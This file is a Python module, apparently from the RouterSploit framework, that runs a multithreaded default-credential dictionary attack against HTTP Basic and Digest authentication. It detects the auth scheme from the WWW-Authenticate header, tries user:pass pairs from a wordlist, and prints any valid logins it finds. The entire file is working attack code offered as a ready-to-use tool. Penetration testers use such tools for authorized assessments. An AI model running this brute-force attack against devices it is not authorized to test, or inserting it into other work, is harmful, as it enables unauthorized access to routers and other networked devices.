from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.resources import wordlists
from requests.auth import HTTPDigestAuth


class Exploit(HTTPClient):
    __info__ = {
        "name": "HTTP Basic/Digest Default Creds",
        "description": "Module performs dictionary attack with default credentials against HTTP Basic/Digest Auth service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
            "Alexander Yakovlev <https://github.com/toxydose>",  # upgrading to perform bruteforce attack against HTTP Digest Auth service
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(8, "Number of threads")

    defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")

    path = OptString("/", "URL Path")

    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.auth_type = None

        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack against {}".format(self.path))

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":", 1)

                if self.auth_type == "digest":
                    auth = HTTPDigestAuth(username, password)
                else:
                    auth = (username, password)

                response = self.http_request(
                    method="GET",
                    path=self.path,
                    auth=auth,
                )

                if response is not None and response.status_code != 401:
                    if self.stop_on_success:
                        running.clear()

                    print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))

                else:
                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

            except StopIteration:
                break

    def check(self):
        response = self.http_request(
            method="GET",
            path=self.path
        )

        if response is None:
            return False

        if response.status_code != 401 or "WWW-Authenticate" not in response.headers.keys():
            print_error("Resource {} is not protected by Basic/Digest Auth".format(self.path), verbose=self.verbosity)
            return False

        if "Basic" in response.headers["WWW-Authenticate"]:
            print_status("Target exposes resource {} protected by Basic Auth".format(self.path), verbose=self.verbosity)
            self.auth_type = "basic"
            return True
        elif "Digest" in response.headers["WWW-Authenticate"]:
            print_status("Target exposes resource {} protected by Digest Auth".format(self.path), verbose=self.verbosity)
            self.auth_type = "digest"
            return True

        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
